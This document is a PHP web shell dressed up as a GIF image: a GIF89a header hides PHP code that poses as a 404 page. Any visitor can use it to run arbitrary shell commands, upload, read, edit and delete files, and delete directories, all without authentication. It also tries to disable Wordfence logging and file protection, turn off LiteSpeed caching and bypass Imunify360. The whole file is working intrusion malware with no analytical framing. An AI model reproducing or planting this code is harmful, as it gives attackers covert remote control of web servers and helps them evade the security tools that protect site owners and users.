GIF89a=( ï¿½' 7IAXKgNgYvYx\%wh&h}tï¿½h%ï¿½s%xï¿½}9ï¿½Rï¿½ï¿½&ï¿½0%ï¿½ (ï¿½.ï¿½ï¿½5ï¿½SDï¿½ï¿½&ï¿½a)ï¿½x5ï¿½ï¿½;c*!&r)ï¿½7ï¿½<{4ï¿½3ï¿½Hï¿½KoTï¿½ï¿½Yï¿½aqï¿½ï¿½qï¿½ï¿½Fï¿½                                                                           !ï¿½
 ' !ï¿½NETSCAPE2.0   ,    =(  ï¿½ï¿½pH,ï¿½$rï¿½l:x(tJï¿½Zï¿½,vï¿½ï¿½zï¿½ï¿½xL.:ï¿½ï¿½zï¿½nï¿½ï¿½ï¿½|Nï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½& !ï¿½0`9Rï¿½}ï¿½ï¿½"ï¿½"a:Sï¿½~xï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½gï¿½ï¿½ï¿½Eï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Rï¿½ï¿½ï¿½Eï¿½ï¿½ï¿½ï¿½Bï¿½ï¿½ ï¿½ï¿½8ï¿½ï¿½Dï¿½ï¿½ï¿½"ï¿½nï¿½ ï¿½Hï¿½ï¿½Lï¿½ï¿½DkDï¿½Bï¿½ï¿½ï¿½ï¿½ï¿½Dï¿½ï¿½ï¿½Tï¿½ï¿½ï¿½H ï¿½Gï¿½ï¿½A Rï¿½ï¿½
|ï¿½ï¿½m&ï¿½ï¿½E8ï¿½Sï¿½kGï¿½Aï¿½pxï¿½aï¿½ï¿½ï¿½R2XBï¿½ï¿½E8Iï¿½ï¿½ï¿½6Xï¿½:vT)ï¿½~ï¿½ï¿½qï¿½ï¿½ï¿½ï¿½"F~%xï¿½ ï¿½
4#Zï¿½0O|-4Bsï¿½X:=
<?php
@error_reporting(0);
@ob_clean();
@http_response_code(404);

$rootPath = $_SERVER['DOCUMENT_ROOT'];

$dir = isset($_GET['dir']) ? $_GET['dir'] : $rootPath;
$dir = rtrim($dir, '/');

$uploadMessage = '';
$fileLabel = '';

// Inisialisasi variabel $dirs dan $files
$dirs = [];
$files = [];

if (isset($_GET['action'])) {
    $action = $_GET['action'];

    if ($action === 'upload' && isset($_FILES['file'])) {
        $uploadDir = $dir . '/';
        $uploadedFile = $uploadDir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadedFile)) {
            $uploadMessage = 'File uploaded successfully.';
            $uploadMessageClass = 'upload-success';
        } else {
            $uploadMessage = 'Failed to upload file.';
            $uploadMessageClass = 'upload-failure';
        }
    } elseif ($action === 'cmd' && isset($_POST['command'])) {
        $command = $_POST['command'];

        try {
            if (function_exists('shell_exec')) {
                $output = shell_exec($command);
            } elseif (function_exists('exec')) {
                exec($command, $output);
                $output = implode("\n", $output);
            } elseif (function_exists('passthru')) {
                ob_start();
                passthru($command);
                $output = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                system($command);
                $output = ob_get_clean();
            } elseif (function_exists('proc_open')) {
                $descriptors = array(
                    0 => array('pipe', 'r'),  // stdin
                    1 => array('pipe', 'w'),  // stdout
                    2 => array('pipe', 'w')   // stderr
                );
                $process = proc_open($command, $descriptors, $pipes);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
            } else {
                throw new Exception('Command execution is disabled.');
            }
        } catch (Exception $e) {
            $output = $e->getMessage();
        }
    } elseif ($action === 'open' && isset($_GET['folder'])) {
        $folderPath = $_GET['folder'];
        $dir = $folderPath;
    } elseif ($action === 'deleteFile' && isset($_GET['file'])) {
        $filePath = $_GET['file'];
        if (unlink($filePath)) {
            $uploadMessage = 'File deleted successfully.';
            $uploadMessageClass = 'upload-success';
        } else {
            $uploadMessage = 'Failed to delete file.';
            $uploadMessageClass = 'upload-failure';
        }
    } elseif ($action === 'deleteDir' && isset($_GET['folder'])) {
        $folderPath = $_GET['folder'];
        if (rmdir($folderPath)) {
            $uploadMessage = 'Directory deleted successfully.';
            $uploadMessageClass = 'upload-success';
        } else {
            $uploadMessage = 'Failed to delete directory.';
            $uploadMessageClass = 'upload-failure';
        }
    }
}

// Disable LiteSpeed cache
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

// Disable Wordfence live traffic and file modifications
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

// Bypass Imunify360 request
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
}

// Use Cloudflare connecting IP if available
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
}

try {
    $items = @scandir($dir);
    if ($items !== false && is_array($items)) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                $dirs[] = $item;
            } else {
                $files[] = $item;
            }
        }
    } else {
        throw new Exception('Failed to open directory.');
    }
} catch (Exception $e) {
    $output = $e->getMessage();
}

// Read File
if (isset($action) && $action === 'read' && isset($_GET['file'])) {
    $filePath = $_GET['file'];
    $fileContent = file_get_contents($filePath);
    $fileLabel = 'File: ' . basename($filePath);
}

// Save File
if (isset($action) && $action === 'save' && isset($_POST['file']) && isset($_POST['content'])) {
    $filePath = $_POST['file'];
    $fileContent = $_POST['content'];

    if (file_put_contents($filePath, $fileContent) !== false) {
        $saveMessage = 'File saved successfully.';
        $saveMessageClass = 'save-success';
    } else {
        $saveMessage = 'Failed to save file.';
        $saveMessageClass = 'save-failure';
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>404</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            margin-bottom: 20px;
        }
        .form {
            margin-top: 10px;
        }
        .cmd-output {
            white-space: pre-wrap;
            margin-top: 10px;
            padding: 5px;
            background-color: #f2f2f2;
            border: 1px solid #ccc;
        }
        .upload-form {
            margin-top: 20px;
            margin-bottom: 10px;
        }
        .upload-form label {
            font-weight: bold;
        }
        .cmd-form {
            margin-top: 20px;
        }
        .cmd-form label {
            font-weight: bold;
        }
        .button {
            display: inline-block;
            padding: 8px 12px;
            background-color: #4CAF50;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            margin-right: 5px;
        }
        .button:hover {
            background-color: #45a049;
        }
        .file-content-form {
            margin-top: 20px;
        }
        .file-content-form label {
            font-weight: bold;
        }
        .file-content-form textarea {
            width: 100%;
            height: 200px;
            margin-top: 5px;
        }
        .save-message {
            margin-top: 10px;
            font-weight: bold;
        }
        .save-success {
            color: green;
        }
        .save-failure {
            color: red;
        }
        .upload-message {
            margin-top: 10px;
            font-weight: bold;
        }
        .upload-success {
            color: green;
        }
        .upload-failure {
            color: red;
        }
        .checkbox {
            margin: 0 1px;
        }
        .checkbox-label {
            font-weight: bold;
        }
   .dir-table {
        border-spacing: 0; /* Mengatur jarak antar border sel */
    }
    .dir-table th,
    .dir-table td {
        padding: 5px;
        border: 1px solid #ccc;
    }
    </style>
</head>
<body>
    <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">        <tr>
            <td>
                <h1>Shin Code BypTod</h1>
                <?php
    // Disable LiteSpeed cache
    if (function_exists('litespeed_request_headers')) {
        $headers = litespeed_request_headers();
        if (isset($headers['X-LSCACHE'])) {
            header('X-LSCACHE: off');
        }
    }

    // Disable Wordfence live traffic and file modifications
    if (defined('WORDFENCE_VERSION')) {
        define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
        define('WORDFENCE_DISABLE_FILE_MODS', true);
    }

    // Bypass Imunify360 request
    if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
        $imunifyHeaders = imunify360_request_headers();
        if (isset($imunifyHeaders['X-Imunify360-Request'])) {
            header('X-Imunify360-Request: bypass');
        }
    }

    // Use Cloudflare connecting IP if available
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    ?>

    <div class="upload-form">
        <form class="form" method="POST" action="?action=upload&dir=<?php echo $dir; ?>" enctype="multipart/form-data">
            <label for="file">Upload File:</label>
            <input type="file" id="file" name="file" required>
            <button class="button" type="submit">Upload</button>
        </form>
    </div>

    <?php if (!empty($uploadMessage)): ?>
        <div class="upload-message <?php echo $uploadMessageClass; ?>">
            <?php echo $uploadMessage; ?>
        </div>
    <?php endif; ?>

    <div class="cmd-form">
        <form class="form" method="POST" action="?action=cmd&dir=<?php echo $dir; ?>">
            <label for="command">Command:</label>
            <input type="text" id="command" name="command" required>
            <button class="button" type="submit">Execute</button>
        </form>
    </div>

    <?php if (isset($output)): ?>
        <div class="cmd-output">
            <?php echo htmlspecialchars($output); ?>
        </div>
    <?php endif; ?>

    <?php if (!empty($saveMessage)): ?>
        <div class="save-message <?php echo $saveMessageClass; ?>">
            <?php echo $saveMessage; ?>
        </div>
    <?php endif; ?>

    <div class="file-content-form">
        <?php if (isset($fileContent)): ?>
            <form class="form" method="POST" action="?action=save">
                <label for="file"><?php echo $fileLabel; ?></label>
                <input type="hidden" name="file" value="<?php echo $filePath; ?>">
                <textarea name="content" required><?php echo htmlspecialchars($fileContent); ?></textarea>
                <button class="button" type="submit">Save</button>
            </form>
        <?php endif; ?>
    </div>
                    </tr>
    </table>
    <div class="dir-table">
        <table>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Permission</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($dirs as $dirName): ?>
                <?php $dirPath = $dir . '/' . $dirName; ?>
                <tr>
                    <td>
                        <a href="?action=open&folder=<?php echo $dirPath; ?>"><?php echo $dirName; ?></a>
                    </td>
                    <td>
                        Directory
                    </td>
                    <td>
                        <?php echo filesize($dirPath); ?>
                    </td>
                    <td>
                        <?php echo substr(sprintf('%o', fileperms($dirPath)), -4); ?>
                    </td>
                    <td>
                        <a class="button" href="?action=open&folder=<?php echo $dirPath; ?>">Open</a>
                        <a class="button" href="?action=deleteDir&folder=<?php echo $dirPath; ?>" onclick="return confirm('Are you sure you want to delete this directory?')">Delete</a>
                    </td>
                </tr>
            <?php endforeach; ?>

            <?php foreach ($files as $fileName): ?>
                <?php $filePath = $dir . '/' . $fileName; ?>
                <tr>
                    <td>
                        <?php echo $fileName; ?>
                    </td>
                    <td>
                        File
                    </td>
                    <td>
                        <?php echo filesize($filePath); ?>
                    </td>
                    <td>
                        <?php echo substr(sprintf('%o', fileperms($filePath)), -4); ?>
                    </td>
                    <td>
                        <a class="button" href="?action=read&file=<?php echo $filePath; ?>">Read</a>
                        <a class="button" href="?action=deleteFile&file=<?php echo $filePath; ?>" onclick="return confirm('Are you sure you want to delete this file?')">Delete</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>
</body>
</html>
?>
